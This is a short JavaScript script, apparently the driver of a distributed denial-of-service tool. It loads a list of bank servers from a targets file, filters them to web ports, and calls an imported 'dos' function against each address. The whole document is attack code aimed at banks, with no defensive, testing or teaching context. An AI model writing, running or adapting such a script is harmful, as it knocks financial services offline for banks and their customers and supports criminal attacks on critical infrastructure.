const { dos } = require("./controllers/ddos.js");
const banks = require("./targets/banks.json");
const allowedPorts = [80, 8080, 443];

banks
  .filter(({ port }) => allowedPorts.includes(port))
  .map(({ ip_str, port }) => {
    const protocol = port === 443 ? "https://" : "http://";
    dos(`${protocol}${ip_str}:${port}`, 150, 0);
  });
